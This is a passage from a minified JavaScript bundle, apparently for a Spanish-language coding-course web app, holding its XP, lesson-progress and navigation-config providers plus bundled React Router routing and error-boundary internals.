Firestore:",ee)}},1e3);return()=>clearTimeout(Y)},[t,e?.uid]);const l=k=>{if(k<100)return{level:1,nextLevelXp:100,currentLevelMin:0};if(k<250)return{level:2,nextLevelXp:250,currentLevelMin:100};if(k<500)return{level:3,nextLevelXp:500,currentLevelMin:250};const Y=Math.floor(k/250)+1;return{level:Y,nextLevelXp:Y*250,currentLevelMin:(Y-1)*250}},u=(k,Y,ee)=>{n(Q=>{if(Q.completed[k]?.[Y])return Q;const q={...Q.completed,[k]:{...Q.completed[k]||{},[Y]:!0}};let M=Q.xp+10;const N=[...Q.awardedBonuses];return Object.values(q[k]||{}).filter(Boolean).length===ee&&!N.includes(k)&&(M+=50,N.push(k)),{...Q,completed:q,xp:M,awardedBonuses:N}})},d=(k,Y)=>!!t.completed[k]?.[Y],p=(k,Y)=>{const ee=t.completed[k];if(!ee||Y===0)return 0;const Q=Object.values(ee).filter(Boolean).length;return Math.round(Q/Y*100)},f=(k,Y,ee)=>{n(Q=>{const q=Q.checklist[k]||{},M=q[Y]||[],N=M.includes(ee)?M.filter(L=>L!==ee):[...M,ee];return{...Q,checklist:{...Q.checklist,[k]:{...q,[Y]:N}}}})},h=(k,Y,ee)=>t.checklist[k]?.[Y]?.includes(ee)||!1,E=(k,Y,ee,Q)=>{n(q=>{const M={...q.favorites};return M[Y]?delete M[Y]:M[Y]={moduleId:k,lessonTitle:ee,moduleTitle:Q},{...q,favorites:M}})},C=k=>!!t.favorites[k],A=k=>{n(Y=>{const Q=Y.favoriteLibraries.includes(k)?Y.favoriteLibraries.filter(q=>q!==k):[...Y.favoriteLibraries,k];return{...Y,favoriteLibraries:Q}})},j=k=>t.favoriteLibraries.includes(k),R=(k,Y)=>{n(ee=>({...ee,lastLessons:{...ee.lastLessons,[k]:Y}}))},I=k=>t.lastLessons[k]||null,w=(k,Y,ee,Q)=>{n(q=>{const M={lessonId:k,moduleId:Y,lessonTitle:ee,moduleTitle:Q,timestamp:Date.now()},N=q.history.filter(_=>_.lessonId!==k),L=[M,...N].slice(0,20);return{...q,history:L}})};return b.jsx(_j.Provider,{value:{markAsCompleted:u,isLessonCompleted:d,getModuleProgress:p,toggleChecklistItem:f,isChecklistItemCompleted:h,toggleFavorite:E,isFavorite:C,calculateLevel:l,updateLastLesson:R,getLastLesson:I,addToHistory:w,history:t.history,favorites:t.favorites,xp:t.xp,syncing:i,favoriteLibraries:t.favoriteLibraries,toggleLibraryFavorite:A,isLibraryFavorite:j},children:a})},Jc=()=>{const a=U.useContext(_j);if(!a)throw new Error("useProgress must be used within a ProgressProvider");return a},qj=U.createContext(void 0),W8=({children:a})=>{const{isAdmin:e}=sr(),[t,n]=U.useState({}),[i,r]=U.useState(!0);U.useEffect(()=>{const u=Eh(Rh,"settings","navigation"),d=Zw(u,p=>{p.exists()?n(p.data()):n({"/roadmap":{enabled:!0,label:"Cursos"},"/libraries":{enabled:!0,label:"Librerias"},"/cheatsheets":{enabled:!0,label:"Trucos"},"/projects":{enabled:!0,label:"Portfolio"},"/profile":{enabled:!0,label:"Perfil"},"/div-playground":{enabled:!0,label:"<div />"}}),r(!1)},p=>{console.error("Error listening to nav config:",p),r(!1)});return()=>d()},[]);const l=u=>{if(e)return!0;const d=t[u];return!(d&&d.enabled===!1)};return b.jsx(qj.Provider,{value:{navConfig:t,loading:i,isPathEnabled:l},children:a})},K8=()=>{const a=U.useContext(qj);if(!a)throw new Error("useNav must be used within a NavProvider");return a},Y8=({isOpen:a,title:e,message:t,onClose:n,type:i="info"})=>a?b.jsx("div",{className:"modal-overlay",onClick:n,children:b.jsxs("div",{className:"modal-content",onClick:r=>r.stopPropagation(),children:[b.jsx("div",{className:`modal-header ${i}`,children:b.jsx("h3",{children:e||(i==="error"?"Error":"Aviso")})}),b.jsx("div",{className:"modal-body",children:b.jsx("p",{children:t})}),b.jsx("div",{className:"modal-footer",children:b.jsx("button",{className:"modal-btn",onClick:n,children:"Entendido"})})]})}):null,$8=U.createContext(void 0),X8=({children:a})=>{const[e,t]=U.useState({isOpen:!1,message:""}),n=(r,l)=>{t({isOpen:!0,message:r,title:l?.title,type:l?.type||"info"})},i=()=>{t(r=>({...r,isOpen:!1}))};return b.jsxs($8.Provider,{value:{showAlert:n},children:[a,b.jsx(Y8,{isOpen:e.isOpen,message:e.message,title:e.title,type:e.type,onClose:i})]})};var nP="popstate";function Z8(a={}){function e(n,i){let{pathname:r,search:l,hash:u}=n.location;return b0("",{pathname:r,search:l,hash:u},i.state&&i.state.usr||null,i.state&&i.state.key||"default")}function t(n,i){return typeof i=="string"?i:rp(i)}return aF(e,t,null,a)}function Ga(a,e){if(a===!1||a===null||typeof a>"u")throw new Error(e)}function Ai(a,e){if(!a){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function eF(){return Math.random().toString(36).substring(2,10)}function iP(a,e){return{usr:a.state,key:a.key,idx:e}}function b0(a,e,t=null,n){return{pathname:typeof a=="string"?a:a.pathname,search:"",hash:"",...typeof e=="string"?Wc(e):e,state:t,key:e&&e.key||n||eF()}}function rp({pathname:a="/",search:e="",hash:t=""}){return e&&e!=="?"&&(a+=e.charAt(0)==="?"?e:"?"+e),t&&t!=="#"&&(a+=t.charAt(0)==="#"?t:"#"+t),a}function Wc(a){let e={};if(a){let t=a.indexOf("#");t>=0&&(e.hash=a.substring(t),a=a.substring(0,t));let n=a.indexOf("?");n>=0&&(e.search=a.substring(n),a=a.substring(0,n)),a&&(e.pathname=a)}return e}function aF(a,e,t,n={}){let{window:i=document.defaultView,v5Compat:r=!1}=n,l=i.history,u="POP",d=null,p=f();p==null&&(p=0,l.replaceState({...l.state,idx:p},""));function f(){return(l.state||{idx:null}).idx}function h(){u="POP";let R=f(),I=R==null?null:R-p;p=R,d&&d({action:u,location:j.location,delta:I})}function E(R,I){u="PUSH";let w=b0(j.location,R,I);p=f()+1;let k=iP(w,p),Y=j.createHref(w);try{l.pushState(k,"",Y)}catch(ee){if(ee instanceof DOMException&&ee.name==="DataCloneError")throw ee;i.location.assign(Y)}r&&d&&d({action:u,location:j.location,delta:1})}function C(R,I){u="REPLACE";let w=b0(j.location,R,I);p=f();let k=iP(w,p),Y=j.createHref(w);l.replaceState(k,"",Y),r&&d&&d({action:u,location:j.location,delta:0})}function A(R){return tF(R)}let j={get action(){return u},get location(){return a(i,l)},listen(R){if(d)throw new Error("A history only accepts one active listener");return i.addEventListener(nP,h),d=R,()=>{i.removeEventListener(nP,h),d=null}},createHref(R){return e(i,R)},createURL:A,encodeLocation(R){let I=A(R);return{pathname:I.pathname,search:I.search,hash:I.hash}},push:E,replace:C,go(R){return l.go(R)}};return j}function tF(a,e=!1){let t="http://localhost";typeof window<"u"&&(t=window.location.origin!=="null"?window.location.origin:window.location.href),Ga(t,"No window.location.(origin|href) available to create URL");let n=typeof a=="string"?a:rp(a);return n=n.replace(/ $/,"%20"),!e&&n.startsWith("//")&&(n=t+n),new URL(n,t)}function kj(a,e,t="/"){return nF(a,e,t,!1)}function nF(a,e,t,n){let i=typeof e=="string"?Wc(e):e,r=Yo(i.pathname||"/",t);if(r==null)return null;let l=Oj(a);iF(l);let u=null;for(let d=0;u==null&&d<l.length;++d){let p=hF(r);u=mF(l[d],p,n)}return u}function Oj(a,e=[],t=[],n="",i=!1){let r=(l,u,d=i,p)=>{let f={relativePath:p===void 0?l.path||"":p,caseSensitive:l.caseSensitive===!0,childrenIndex:u,route:l};if(f.relativePath.startsWith("/")){if(!f.relativePath.startsWith(n)&&d)return;Ga(f.relativePath.startsWith(n),`Absolute route path "${f.relativePath}" nested under path "${n}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),f.relativePath=f.relativePath.slice(n.length)}let h=Ho([n,f.relativePath]),E=t.concat(f);l.children&&l.children.length>0&&(Ga(l.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${h}".`),Oj(l.children,e,E,h,d)),!(l.path==null&&!l.index)&&e.push({path:h,score:dF(h,l.index),routesMeta:E})};return a.forEach((l,u)=>{if(l.path===""||!l.path?.includes("?"))r(l,u);else for(let d of Uj(l.path))r(l,u,!0,d)}),e}function Uj(a){let e=a.split("/");if(e.length===0)return[];let[t,...n]=e,i=t.endsWith("?"),r=t.replace(/\?$/,"");if(n.length===0)return i?[r,""]:[r];let l=Uj(n.join("/")),u=[];return u.push(...l.map(d=>d===""?r:[r,d].join("/"))),i&&u.push(...l),u.map(d=>a.startsWith("/")&&d===""?"/":d)}function iF(a){a.sort((e,t)=>e.score!==t.score?t.score-e.score:pF(e.routesMeta.map(n=>n.childrenIndex),t.routesMeta.map(n=>n.childrenIndex)))}var oF=/^:[\w-]+$/,sF=3,rF=2,lF=1,cF=10,uF=-2,oP=a=>a==="*";function dF(a,e){let t=a.split("/"),n=t.length;return t.some(oP)&&(n+=uF),e&&(n+=rF),t.filter(i=>!oP(i)).reduce((i,r)=>i+(oF.test(r)?sF:r===""?lF:cF),n)}function pF(a,e){return a.length===e.length&&a.slice(0,-1).every((n,i)=>n===e[i])?a[a.length-1]-e[e.length-1]:0}function mF(a,e,t=!1){let{routesMeta:n}=a,i={},r="/",l=[];for(let u=0;u<n.length;++u){let d=n[u],p=u===n.length-1,f=r==="/"?e:e.slice(r.length)||"/",h=Ih({path:d.relativePath,caseSensitive:d.caseSensitive,end:p},f),E=d.route;if(!h&&p&&t&&!n[n.length-1].route.index&&(h=Ih({path:d.relativePath,caseSensitive:d.caseSensitive,end:!1},f)),!h)return null;Object.assign(i,h.params),l.push({params:i,pathname:Ho([r,h.pathname]),pathnameBase:yF(Ho([r,h.pathnameBase])),route:E}),h.pathnameBase!=="/"&&(r=Ho([r,h.pathnameBase]))}return l}function Ih(a,e){typeof a=="string"&&(a={path:a,caseSensitive:!1,end:!0});let[t,n]=fF(a.path,a.caseSensitive,a.end),i=e.match(t);if(!i)return null;let r=i[0],l=r.replace(/(.)\/+$/,"$1"),u=i.slice(1);return{params:n.reduce((p,{paramName:f,isOptional:h},E)=>{if(f==="*"){let A=u[E]||"";l=r.slice(0,r.length-A.length).replace(/(.)\/+$/,"$1")}const C=u[E];return h&&!C?p[f]=void 0:p[f]=(C||"").replace(/%2F/g,"/"),p},{}),pathname:r,pathnameBase:l,pattern:a}}function fF(a,e=!1,t=!0){Ai(a==="*"||!a.endsWith("*")||a.endsWith("/*"),`Route path "${a}" will be treated as if it were "${a.replace(/\*$/,"/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${a.replace(/\*$/,"/*")}".`);let n=[],i="^"+a.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(l,u,d)=>(n.push({paramName:u,isOptional:d!=null}),d?"/?([^\\/]+)?":"/([^\\/]+)")).replace(/\/([\w-]+)\?(\/|$)/g,"(/$1)?$2");return a.endsWith("*")?(n.push({paramName:"*"}),i+=a==="*"||a==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?i+="\\/*$":a!==""&&a!=="/"&&(i+="(?:(?=\\/|$))"),[new RegExp(i,e?void 0:"i"),n]}function hF(a){try{return a.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return Ai(!1,`The URL path "${a}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${e}).`),a}}function Yo(a,e){if(e==="/")return a;if(!a.toLowerCase().startsWith(e.toLowerCase()))return null;let t=e.endsWith("/")?e.length-1:e.length,n=a.charAt(t);return n&&n!=="/"?null:a.slice(t)||"/"}var gF=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;function bF(a,e="/"){let{pathname:t,search:n="",hash:i=""}=typeof a=="string"?Wc(a):a,r;return t?(t=t.replace(/\/\/+/g,"/"),t.startsWith("/")?r=sP(t.substring(1),"/"):r=sP(t,e)):r=e,{pathname:r,search:EF(n),hash:SF(i)}}function sP(a,e){let t=e.replace(/\/+$/,"").split("/");return a.split("/").forEach(i=>{i===".."?t.length>1&&t.pop():i!=="."&&t.push(i)}),t.length>1?t.join("/"):"/"}function Xv(a,e,t,n){return`Cannot include a '${a}' character in a manually specified \`to.${e}\` field [${JSON.stringify(n)}].  Please separate it out to the \`to.${t}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function vF(a){return a.filter((e,t)=>t===0||e.route.path&&e.route.path.length>0)}function t1(a){let e=vF(a);return e.map((t,n)=>n===e.length-1?t.pathname:t.pathnameBase)}function n1(a,e,t,n=!1){let i;typeof a=="string"?i=Wc(a):(i={...a},Ga(!i.pathname||!i.pathname.includes("?"),Xv("?","pathname","search",i)),Ga(!i.pathname||!i.pathname.includes("#"),Xv("#","pathname","hash",i)),Ga(!i.search||!i.search.includes("#"),Xv("#","search","hash",i)));let r=a===""||i.pathname==="",l=r?"/":i.pathname,u;if(l==null)u=t;else{let h=e.length-1;if(!n&&l.startsWith("..")){let E=l.split("/");for(;E[0]==="..";)E.shift(),h-=1;i.pathname=E.join("/")}u=h>=0?e[h]:"/"}let d=bF(i,u),p=l&&l!=="/"&&l.endsWith("/"),f=(r||l===".")&&t.endsWith("/");return!d.pathname.endsWith("/")&&(p||f)&&(d.pathname+="/"),d}var Ho=a=>a.join("/").replace(/\/\/+/g,"/"),yF=a=>a.replace(/\/+$/,"").replace(/^\/*/,"/"),EF=a=>!a||a==="?"?"":a.startsWith("?")?a:"?"+a,SF=a=>!a||a==="#"?"":a.startsWith("#")?a:"#"+a,CF=class{constructor(a,e,t,n=!1){this.status=a,this.statusText=e||"",this.internal=n,t instanceof Error?(this.data=t.toString(),this.error=t):this.data=t}};function TF(a){return a!=null&&typeof a.status=="number"&&typeof a.statusText=="string"&&typeof a.internal=="boolean"&&"data"in a}function xF(a){return a.map(e=>e.route.path).filter(Boolean).join("/").replace(/\/\/*/g,"/")||"/"}var zj=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";function Bj(a,e){let t=a;if(typeof t!="string"||!gF.test(t))return{absoluteURL:void 0,isExternal:!1,to:t};let n=t,i=!1;if(zj)try{let r=new URL(window.location.href),l=t.startsWith("//")?new URL(r.protocol+t):new URL(t),u=Yo(l.pathname,e);l.origin===r.origin&&u!=null?t=u+l.search+l.hash:i=!0}catch{Ai(!1,`<Link to="${t}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}return{absoluteURL:n,isExternal:i,to:t}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");var Fj=["POST","PUT","PATCH","DELETE"];new Set(Fj);var AF=["GET",...Fj];new Set(AF);var Kc=U.createContext(null);Kc.displayName="DataRouter";var ug=U.createContext(null);ug.displayName="DataRouterState";var PF=U.createContext(!1),Vj=U.createContext({isTransitioning:!1});Vj.displayName="ViewTransition";var LF=U.createContext(new Map);LF.displayName="Fetchers";var RF=U.createContext(null);RF.displayName="Await";var Mn=U.createContext(null);Mn.displayName="Navigation";var Rp=U.createContext(null);Rp.displayName="Location";var Li=U.createContext({outlet:null,matches:[],isDataRoute:!1});Li.displayName="Route";var i1=U.createContext(null);i1.displayName="RouteError";var Hj="REACT_ROUTER_ERROR",IF="REDIRECT",wF="ROUTE_ERROR_RESPONSE";function jF(a){if(a.startsWith(`${Hj}:${IF}:{`))try{let e=JSON.parse(a.slice(28));if(typeof e=="object"&&e&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.location=="string"&&typeof e.reloadDocument=="boolean"&&typeof e.replace=="boolean")return e}catch{}}function DF(a){if(a.startsWith(`${Hj}:${wF}:{`))try{let e=JSON.parse(a.slice(40));if(typeof e=="object"&&e&&typeof e.status=="number"&&typeof e.statusText=="string")return new CF(e.status,e.statusText,e.data)}catch{}}function MF(a,{relative:e}={}){Ga(Yc(),"useHref() may be used only in the context of a <Router> component.");let{basename:t,navigator:n}=U.useContext(Mn),{hash:i,pathname:r,search:l}=Ip(a,{relative:e}),u=r;return t!=="/"&&(u=r==="/"?t:Ho([t,r])),n.createHref({pathname:u,search:l,hash:i})}function Yc(){return U.useContext(Rp)!=null}function ai(){return Ga(Yc(),"useLocation() may be used only in the context of a <Router> component."),U.useContext(Rp).location}var Gj="You should call navigate() in a React.useEffect(), not when your component is first rendered.";function Qj(a){U.useContext(Mn).static||U.useLayoutEffect(a)}function rr(){let{isDataRoute:a}=U.useContext(Li);return a?JF():NF()}function NF(){Ga(Yc(),"useNavigate() may be used only in the context of a <Router> component.");let a=U.useContext(Kc),{basename:e,navigator:t}=U.useContext(Mn),{matches:n}=U.useContext(Li),{pathname:i}=ai(),r=JSON.stringify(t1(n)),l=U.useRef(!1);return Qj(()=>{l.current=!0}),U.useCallback((d,p={})=>{if(Ai(l.current,Gj),!l.current)return;if(typeof d=="number"){t.go(d);return}let f=n1(d,JSON.parse(r),i,p.relative==="path");a==null&&e!=="/"&&(f.pathname=f.pathname==="/"?e:Ho([e,f.pathname])),(p.replace?t.replace:t.push)(f,p.state,p)},[e,t,r,i,a])}U.createContext(null);function _F(){let{matches:a}=U.useContext(Li),e=a[a.length-1];return e?e.params:{}}function Ip(a,{relative:e}={}){let{matches:t}=U.useContext(Li),{pathname:n}=ai(),i=JSON.stringify(t1(t));return U.useMemo(()=>n1(a,JSON.parse(i),n,e==="path"),[a,i,n,e])}function qF(a,e){return Jj(a,e)}function Jj(a,e,t,n,i){Ga(Yc(),"useRoutes() may be used only in the context of a <Router> component.");let{navigator:r}=U.useContext(Mn),{matches:l}=U.useContext(Li),u=l[l.length-1],d=u?u.params:{},p=u?u.pathname:"/",f=u?u.pathnameBase:"/",h=u&&u.route;{let w=h&&h.path||"";Kj(p,!h||w.endsWith("*")||w.endsWith("*?"),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${p}" (under <Route path="${w}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${w}"> to <Route path="${w==="/"?"*":`${w}/*`}">.`)}let E=ai(),C;if(e){let w=typeof e=="string"?Wc(e):e;Ga(f==="/"||w.pathname?.startsWith(f),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${f}" but pathname "${w.pathname}" was given in the \`location\` prop.`),C=w}else C=E;let A=C.pathname||"/",j=A;if(f!=="/"){let w=f.replace(/^\//,"").split("/");j="/"+A.replace(/^\//,"").split("/").slice(w.length).join("/")}let R=kj(a,{pathname:j});Ai(h||R!=null,`No routes matched location "${C.pathname}${C.search}${C.hash}" `),Ai(R==null||R[R.length-1].route.element!==void 0||R[R.length-1].route.Component!==void 0||R[R.length-1].route.lazy!==void 0,`Matched leaf route at location "${C.pathname}${C.search}${C.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let I=BF(R&&R.map(w=>Object.assign({},w,{params:Object.assign({},d,w.params),pathname:Ho([f,r.encodeLocation?r.encodeLocation(w.pathname.replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:w.pathname]),pathnameBase:w.pathnameBase==="/"?f:Ho([f,r.encodeLocation?r.encodeLocation(w.pathnameBase.replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:w.pathnameBase])})),l,t,n,i);return e&&I?U.createElement(Rp.Provider,{value:{location:{pathname:"/",search:"",hash:"",state:null,key:"default",...C},navigationType:"POP"}},I):I}function kF(){let a=QF(),e=TF(a)?`${a.status} ${a.statusText}`:a instanceof Error?a.message:JSON.stringify(a),t=a instanceof Error?a.stack:null,n="rgba(200,200,200, 0.5)",i={padding:"0.5rem",backgroundColor:n},r={padding:"2px 4px",backgroundColor:n},l=null;return console.error("Error handled by React Router default ErrorBoundary:",a),l=U.createElement(U.Fragment,null,U.createElement("p",null," Hey developer "),U.createElement("p",null,"You can provide a way better UX than this when your app throws errors by providing your own ",U.createElement("code",{style:r},"ErrorBoundary")," or"," ",U.createElement("code",{style:r},"errorElement")," prop on your route.")),U.createElement(U.Fragment,null,U.createElement("h2",null,"Unexpected Application Error!"),U.createElement("h3",{style:{fontStyle:"italic"}},e),t?U.createElement("pre",{style:i},t):null,l)}var OF=U.createElement(kF,null),Wj=class extends U.Component{constructor(a){super(a),this.state={location:a.location,revalidation:a.revalidation,error:a.error}}static getDerivedStateFromError(a){return{error:a}}static getDerivedStateFromProps(a,e){return e.location!==a.location||e.revalidation!=="idle"&&a.revalidation==="idle"?{error:a.error,location:a.location,revalidation:a.revalidation}:{error:a.error!==void 0?a.error:e.error,location:e.location,revalidation:a.revalidation||e.revalidation}}componentDidCatch(a,e){this.props.onError?this.props.onError(a,e):console.error("React Router caught the following error during render",a)}render(){let a=this.state.error;if(this.context&&typeof a=="object"&&a&&"digest"in a&&typeof a.digest=="string"){const t=DF(a.digest);t&&(a=t)}let e=a!==void 0?U.createElement(Li.Provider,{value:this.props.routeContext},U.createElement(i1.Provider,{value:a,children:this.props.component})):this.props.children;return this.context?U.createElement(UF,{error:a},e):e}};Wj.contextType=PF;var Zv=new WeakMap;function UF({children:a,error:e}){let{basename:t}=U.useContext(Mn);if(typeof e=="object"&&e&&"digest"in e&&typeof e.digest=="string"){let n=jF(e.digest);if(n){let i=Zv.get(e);if(i)throw i;let r=Bj(n.location,t);if(zj&&!Zv.get(e))if(r.isExternal||n.reloadDocument)window.location.href=r.absoluteURL||r.to;else{const l=Promise.resolve().then(()=>window.__reactRouterDataRouter.navigate(r.to,{replace:n.replace}));throw Zv.set(e,l),l}return U.createElement("meta",{httpEquiv:"refresh",content:`0;url=${r.absoluteURL||r.to}`})}}return a}function zF({routeContext:a,match:e,children:t}){let n=U.useContext(Kc);return n&&n.static&&n.staticContext&&(e.route.errorElement||e.route.ErrorBoundary)&&(n.staticContext._deepestRenderedBoundaryId=e.route.id),U.createElement(Li.Provider,{value:a},t)}function BF(a,e=[],t=null,n=null,i=null){if(a==null){if(!t)return null;if(t.errors)a=t.matches;else if(e.length===0&&!t.initialized&&t.matches.length>0)a=t.matches;else return null}let r=a,l=t?.errors;if(l!=null){let f=r.findIndex(h=>h.route.id&&l?.[h.route.id]!==void 0);Ga(f>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(l).join(",")}`),r=r.slice(0,Math.min(r.length,f+1))}let u=!1,d=-1;if(t)for(let f=0;f<r.length;f++){let h=r[f];if((h.route.HydrateFallback||h.route.hydrateFallbackElement)&&(d=f),h.route.id){let{loaderData:E,errors:C}=t,A=h.route.loader&&!E.hasOwnProperty(h.route.id)&&(!C||C[h.route.id]===void 0);if(h.route.lazy||A){u=!0,d>=0?r=r.slice(0,d+1):r=[r[0]];break}}}let p=t&&n?(f,h)=>{n(f,{location:t.location,params:t.matches?.[0]?.params??{},unstable_pattern:xF(t.matches),errorInfo:h})}:void 0;return r.reduceRight((f,h,E)=>{let C,A=!1,j=null,R=null;t&&(C=l&&h.route.id?l[h.route.id]:void 0,j=h.route.errorElement||OF,u&&(d<0&&E===0?(Kj("route-fallback",!1,"No `HydrateFallback` element provided to render during initial hydration"),A=!0,R=null):d===E&&(A=!0,R=h.route.hydrateFallbackElement||null)));let I=e.concat(r.slice(0,E+1)),w=()=>{let k;return C?k=j:A?k=R:h.route.Component?k=U.createElement(h.route.Component,null):h.route.element?k=h.route.element:k=f,U.createElement(zF,{match:h,routeContext:{outlet:f,matches:I,isDataRoute:t!=null},children:k})};return t&&(h.route.ErrorBoundary||h.route.errorElement||E===0)?U.createElement(Wj,{location:t.location,revalidation:t.revalidation,component:j,error:C,children:w(),routeContext:{outlet:null,matches:I,isDataRoute:!0},onError:p}):w()},null)}function o1(a){return`${a} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function FF(a){let e=U.useContext(Kc);return Ga(e,o1(a)),e}function VF(a){let e=U.useContext(ug);return Ga(e,o1(a)),e}function HF(a){let e=U.useContext(Li);return Ga(e,o1(a)),e}function s1(a){let e=HF(a),t=e.matches[e.matches.length-1];return Ga(t.route.id,`${a} can only be used on routes that contain a unique "id"`),t.route.id}function GF(){return s1("useRouteId")}function QF(){let a=U.useContext(i1),e=VF("useRouteError"),t=s1("useRouteError");return a!==void 0?a:e.errors?.[t]}function JF(){let{router:a}=FF("useNavigate"),e=s1("useNavigate"),t=U.useRef(!1);return Qj(()=>{t.current=!0}),U.useCallback(async(i,r={})=>{Ai(t.current,Gj),t.current&&(typeof i=="number"?await a.navigate(i):await a.navigate(i,{fromRouteId:e,...r}))},[a,e])}var rP={};function Kj(a,e,t){!e&&!rP[a]&&(rP[a]=!0,Ai(!1,t))}U.memo(WF);function WF({routes:a,future:e,state:t,onError:n}){return Jj(a,void 0,t,n,e)}function Yj({to:a,replace:e,state:t,relative:n}){Ga(Yc(),"<Navigate> may be used only in the context of a <Router> component.");let{static:i}=U.useContext(Mn);Ai(!i,"<Navigate> must not be used on the initial render in a <StaticRouter>. This is a no-op, but you should modify your code so the <Navigate> is only ever rendered in response to some user interaction or state change.");let{matches:r}=U.useContext(Li),{pathname:l}=ai(),u=rr(),d=n1(a,t1(r),l,n==="path"),p=JSON.stringify(d);return U.useEffect(()=>{u(JSON.parse(p),{replace:e,state:t,relative:n})},[u,p,n,e,t]),null}function $t(a){Ga(!1,"A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")}function KF({basename:a="/",children:e=null,location:t,navigationType:n="POP",navigator:i,static:r=!1,unstable_useTransitions:l}){Ga(!Yc(),"You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");let u=a.replace(/^\/*/,"/"),d=U.useMemo(()=>({basename:u,navigator:i,static:r,unstable_useTransitions:l,future:{}}),[u,i,r,l]);typeof t=="string"&&(t=Wc(t));let{pathname:p="/",search:f="",hash:h="",state:E=null,key:C="default"}=t,A=U.useMemo(()=>{let j=Yo(p,u);return j==null?null:{location:{pathname:j,search:f,hash:h,state:E,key:C},navigationType:n}},[u,p,f,h,E,C,n]);return Ai(A!=null,`<Router basename="${u}"> is not able to match the URL "${p}${f}${h}" because it does not start with the basename, so the <Router> won't render anything.`),A==null?null:U.createElement(Mn.Provider,{value:d},U.createElement(Rp.Provider,{children:e,value:A}))}function YF({children:a,location:e}){return qF(v0(a),e)}function v0(a,e=[]){let t=[];return U.Children.forEach(a,(n,i)=>{if(!U.isValidElement(n))return;let r=[...e,i];if(n.type===U.Fragment){t.push.apply(t,v0(n.props.children,r));return}Ga(n.type===$t,`[${typeof n.type=="string"?n.type:n.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),Ga(!n.props.index||!n.props.children,"An index route cannot have child routes.");let l={id:n.props.id||r.join("-"),caseSensitive:n.props.caseSensitive,element:n.props.element,Component:n.props.Component,index:n.props.index,path:n.props.path,middleware:n.props.middleware,loader:n.props.loader,action:n.props.action,hydrateFallbackElement:n.props.hydrateFallbackElement,HydrateFallback:n.props.HydrateFallback,errorElement:n.props.errorElement,ErrorBoundary:n.props.ErrorBoundary,hasErrorBoundary:n.props.hasErrorBoundary===!0||n.props.ErrorBoundary!=null||n.props.errorElement!=null,shouldRevalidate:n.props.shouldRevalidate,handle:n.props.handle,lazy:n.props.lazy};n.props.children&&(l.children=v0(n.props.children,r)),t.push(l)}),t}var Gf="get",Qf="application/x-www-form-urlencoded";function dg(a){return typeof HTMLElement<"u"&&a instanceof HTMLElement}function $F(a){return dg(a)&&a.tagName.toLowerCase()==="button"}function XF(a){return dg(a)&&a.tagName.toLowerCase()==="form"}function ZF(a){return dg(a)&&a.tagName.toLowerCase()==="input"}function eV(a){return!!(a.metaKey||a.altKey||a.ctrlKey||a.shiftKey)}function aV(a,e){return a.button===0&&(!e||e==="_self")&&!eV(a)}var Sf=null;function tV(){if(Sf===null)try{new FormData(document.createElement("form"),0),Sf=!1}catch{Sf=!0}return Sf}var nV=new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);function ey(a){return a!=null&&!nV.has(a)?(Ai(!1,`"${a}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Qf}"`),null):a}function iV(a,e){let t,n,i,r,l;if(XF(a)){let u=a.getAttribute("action");n=u?Yo(u,e):null,t=a.getAttribute("method")||Gf,i=ey(a.getAttribute("enctype"))||Qf,r=new FormData(a)}else if($F(a)||ZF(a)&&(a.type==="submit"||a.type==="image")){let u=a.form;if(u==null)throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');let d=a.getAttribute("formaction")||u.getAttribute("action");if(n=d?Yo(d,e):null,t=a.getAttribute("formmethod")||u.getAttribute("method")||Gf,i=ey(a.getAttribute("formenctype"))||ey(u.getAttribute("enctype"))||Qf,r=new FormData(u,a),!tV()){let{name:p,type:f,value:h}=a;if(f==="image"){let E=p?`${p}.`:"";r.append(`${E}x`,"0"),r.append(`${E}y`,"0")}else p&&r.append(p,h)}}else{if(dg(a))throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');t=Gf,n=null,i=Qf,l=a}return r&&i==="text/plain"&&(l=r,r=void 0),{action:n,method:t.toLowerCase(),encType:i,formData:r,body:l}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");function r1(a,e){if(a===!1||a===null||typeof a>"u")throw new Error(e)}function oV(a,e,t,n){let i=typeof a=="string"?new URL(a,typeof window>"u"?"server://singlefetch/":window.location.origin):a;return t?i.pathname.endsWith("/")?i.pathname=`${i.pathname}_.${n}`:i.pathname=`${i.pathname}.${n}`:i.pathname==="/"?i.pathname=`_root.${n}`:e&&Yo(i.pathname,e)==="/"?i.pathname=`${e.replace(/\/$/,"")}/_root.${n}`:i.pathname=`${i.pathname.replace(/\/$/,"")}.${n}`,i}async function sV(a,e){if(a.id in e)return e[a.id];try{let t=await import(a.module);return 